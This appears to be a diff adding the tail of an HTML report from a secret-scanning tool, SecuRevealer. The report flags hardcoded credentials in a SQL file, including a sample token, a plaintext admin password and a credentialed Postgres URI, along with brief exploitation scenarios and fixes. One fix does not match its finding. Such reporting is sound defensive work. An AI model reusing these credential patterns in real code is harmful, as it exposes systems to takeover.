+        <pre class="code"><code>GITHUB_TOKEN = &quot;ghp_0123456789abcdefghijklmnopqrstuvwxyz&quot;</code></pre>
+        <pre class="fix"><code># AFTER
+echo &quot;.env&quot; &gt;&gt; .gitignore
+git rm --cached .env   # then rotate ALL values in it</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration">https://owasp.org/www-project-top-ten/2021/A05_2021-Security_Misconfiguration</a></p>
+      </div>
+    </section>
+
+    <section class="file">
+      <h3>query.sql <span class="meta">(sql, 2 findings, risk 17)</span></h3>
+      
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 9:46</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>SELECT * FROM users WHERE name = 'admin' AND password = 'AdminPassw0rd!';</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Database connection string with embedded credentials</strong>
+          <span class="mono loc">line 6:4</span>
+          <span class="chip mono">DB_CONN_CREDENTIALS</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> user:password@host URIs embed credentials where logs, crash traces, and APM tools routinely capture them.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> One verbose error log pasted to a public issue = full database access.</p>
+        <pre class="code"><code>-- postgres://admin:Sup3rS3cret@db.internal:5432/prod</code></pre>
+        <pre class="fix"><code># AFTER
+DATABASE_URL=postgres://user@host/db   # password via vault/secret store
+# or: pgpass file / IAM auth tokens</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+    </section>
+
+  <footer>
+    Generated by <strong>SecuRevealer</strong> — AI-assisted insecure-pattern review · 2026-09-21T17:44:06.468Z<br>
+    Educational tool: patterns are heuristic; verify findings before acting.
+  </footer>
+</div>
+</body>
+</html>
